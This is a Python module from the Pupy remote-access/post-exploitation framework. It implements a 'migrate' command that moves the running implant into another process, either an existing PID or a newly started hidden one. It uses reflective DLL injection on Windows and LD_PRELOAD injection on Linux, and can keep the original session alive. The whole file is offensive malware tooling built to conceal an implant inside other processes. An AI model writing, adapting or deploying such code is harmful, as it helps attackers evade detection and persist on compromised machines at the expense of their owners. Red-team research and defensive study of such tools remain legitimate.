# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
import pupygen
import os.path
import time
from modules.lib.windows.migrate import migrate as win_migrate
from modules.lib.linux.migrate import migrate as lin_migrate
from modules.lib.linux.migrate import ld_preload

__class_name__="MigrateModule"


@config(cat="manage", compat=["linux", "windows"])
class MigrateModule(PupyModule):
    """ Migrate pupy into another process using reflective DLL injection """
    max_clients=1
    dependencies={
        'windows': ['psutil', 'pupwinutils.processes']
    }

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="migrate", description=self.__doc__)
        self.arg_parser.add_argument('--no-wait', action='store_false', default=True,
                            help='Does not Hook exit thread function and wait until pupy exists (Linux)')

        group = self.arg_parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-c', '--create', metavar='<exe_path>',
                            help='create a new process and inject into it')
        group.add_argument('pid', nargs='?', type=int, help='pid')
        self.arg_parser.add_argument('-k', '--keep', action='store_true' ,help='migrate into the process but create a new session and keep the current pupy session running')
	self.arg_parser.add_argument('-t', '--timeout', type=int, default=30, help='time in seconds to wait for the connection')

    def run(self, args):
        if self.client.is_windows():
            pid=None
            if args.create:
                self.success("Migrating to new windows process")
                p=self.client.conn.modules['pupwinutils.processes'].start_hidden_process(args.create)
                pid=p.pid
                self.success("%s created with pid %s"%(args.create,pid))
            else:
                self.success("Migrating to existing windows process")
                pid=args.pid
            win_migrate(self, pid, args.keep, args.timeout)
        elif self.client.is_linux():
            if args.create:
                self.success("Migrating to new linux process using LD_PRELOAD")
                ld_preload(self, args.create, wait_thread=args.no_wait, keep=args.keep)
            else:
                self.success("Migrating to existing linux process")
                lin_migrate(self, args.pid, args.keep)
